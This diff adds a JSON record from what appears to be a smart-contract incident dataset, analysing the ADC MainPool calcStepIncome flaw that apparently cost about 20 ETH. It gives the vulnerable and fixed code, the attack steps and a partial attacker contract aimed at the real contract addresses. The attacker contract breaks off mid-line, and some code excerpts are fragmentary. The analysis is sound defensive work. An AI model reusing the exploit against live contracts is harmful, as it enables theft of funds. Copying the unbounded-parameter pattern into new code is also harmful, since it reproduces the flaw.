@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-02-06_ADC_BusinessLogicFlaw",
+ "source_file": "2024/2024-02-06_ADC_BusinessLogicFlaw.md",
+ "title": "ADC (MainPool) — calcStepIncome Business Logic Flaw Analysis",
+ "date": "2024-02-06",
+ "protocol": "ADC",
+ "chain": "Ethereum",
+ "loss_raw": "~20 ETH",
+ "loss_usd": null,
+ "root_cause": "`calcStepIncome()` accepts arbitrarily large parameter values without validation, allowing abnormal withdrawal amount calculation",
+ "attack_tx": null,
+ "vulnerable_contract": "MainPool 0xdE46fcF6",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no upper-bound validation on parameter\nfunction calcStepIncome(uint256 stepValue) external returns (uint256) {\n    // No upper bound on stepValue — arbitrarily large value can be injected\n    uint256 income = userDeposit[msg.sender] * stepValue / DIVISOR;\n    pendingIncome[msg.sender] += income;\n    return income;\n}\n\n//",
+  "// File: MainPool.sol\ncontract gameDataSet {\n    }\n    \n    struct Player{\n        //uint256 pID;\n        uint256 ticketInCost;     // how many eth can join\n        uint256   withdrawAmount;     // how many eth can join  // ❌ vulnerability\n        uint256 startTime;      // join the game time\n        uint256 totalSettled;   // rturn  funds\n        uint256 staticIncome;\n        uint256 lastCalcSITime;      // last Calc staticIncome Time  \n        //uint256 lastCalcDITime; //  last Calc dynamicIncome Time\n        uint256 dynamicIncome; //  last Calc dynamicIncome\n        uint256 stepIncome;\n        bool isActive; // 1 mean is 10eth,2 have new one son,3,\n        bool isAlreadGetIns;// already get insePoolBalance income;\n    }\n    \n    \n    struct Round{\n        uint256 rID;            //Round ID\n        uint256 rStartTime;      //Round start ID\n        uint256 rPlys;           // new round players\n        uint256 lastPID;         // last Player ID pID\n        uint256 totalInseAmount; // \n        uint256 fritInsePoint;"
+ ],
+ "code_after": [
+  "✅ Safe code: parameter range validation + maximum withdrawal cap\nuint256 constant MAX_STEP_VALUE = 1000; // 10x maximum\n\nfunction calcStepIncome(uint256 stepValue) external returns (uint256) {\n    require(stepValue <= MAX_STEP_VALUE, \"step value too large\");\n    uint256 income = userDeposit[msg.sender] * stepValue / DIVISOR;\n    require(pendingIncome[msg.sender] + income <= userDeposit[msg.sender] * 3, \"exceeds max\");\n    pendingIncome[msg.sender] += income;\n    return income;\n}"
+ ],
+ "steps": [
+  "→ [1] Send 18 ETH to Helper contract",
+  "→ [2] Ticket.buyADC(3 ETH) → Purchase ADC ticket",
+  "→ [3] MainPool.joinGame(15 ETH) → Join game",
+  "→ [4] MainPool.calcStepIncome(very large value)",
+  "→ [5] MainPool.withdraw() → Withdraw inflated amount",
+  "→ [6] ~20 ETH profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Send 18 ETH to Helper contract\n  │\n  ├─→ [2] Ticket.buyADC(3 ETH) → Purchase ADC ticket\n  │\n  ├─→ [3] MainPool.joinGame(15 ETH) → Join game\n  │\n  ├─→ [4] MainPool.calcStepIncome(very large value)\n  │         └─ Withdrawable amount inflated abnormally\n  │\n  ├─→ [5] MainPool.withdraw() → Withdraw inflated amount\n  │\n  └─→ [6] ~20 ETH profit",
+  "interface IMainPool {\n    function joinGame(uint256 amount) external;\n    function calcStepIncome(uint256 stepValue) external returns (uint256);\n    function withdraw() external;\n}\n\ninterface ITicket {\n    function buyADC(uint256 amount) external payable;\n}\n\ncontract HelperContract {\n    IMainPool constant mainpool = IMainPool(0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8);\n    ITicket   constant ticket   = ITicket(0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50);\n\n    function startwith() external payable {\n        // [1] Purchase ADC ticket (3 ETH)\n        ticket.buyADC{value: 3 ether}(3 ether);\n\n        // [2] Join game (15 ETH)\n        mainpool.joinGame{value: 15 ether}(15 ether);\n\n        // [3] Calculate income with inflated step value\n        mainpool.calcStepIncome(type(uint256).max / DIVI"
+ ]
+}
